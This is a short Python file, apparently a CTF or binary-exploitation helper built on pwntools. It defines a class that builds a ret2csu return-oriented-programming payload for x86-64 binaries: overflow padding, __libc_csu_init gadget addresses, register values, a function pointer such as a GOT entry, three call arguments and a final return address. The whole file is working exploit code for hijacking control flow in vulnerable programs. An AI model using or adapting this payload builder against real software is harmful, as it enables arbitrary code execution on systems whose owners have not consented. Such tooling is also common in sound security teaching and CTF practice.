# encoding:utf-8
from pwn import *
class CSU:
    # downAddr: from  "pop     rbx"
    # upAddr: from "mov     rdx, r13"
    def __init__(self, padding, downAddr, upAddr, paddingChar = 'A',extraPadding = 0):
        self.downaddr = downAddr
        self.upaddr = upAddr
        self.padding = padding
        self.paddingChar = paddingChar
        self.extraPadding = extraPadding 

    # func_ptr: like something in the got table
    def get_payload(self, func_ptr, arg1, arg2, arg3, retAddr, controlEBP = True):
        payload = flat([
            self.padding * self.paddingChar,
            p64(self.downaddr),
            self.paddingChar * self.extraPadding,
            p64(0) + p64(1) if controlEBP else '', # p64(rbx) + p64(rbp)
            p64(func_ptr),  # used to call qword ptr [r12+rbx*8]
            p64(arg3), # r13 -> rdx 
            p64(arg2), # r14 -> rsi
            p64(arg1), # r15 -> edi 只能控制底字节
            p64(self.upaddr),
            'A' * 0x38,
            p64(retAddr)
        ])
        return payload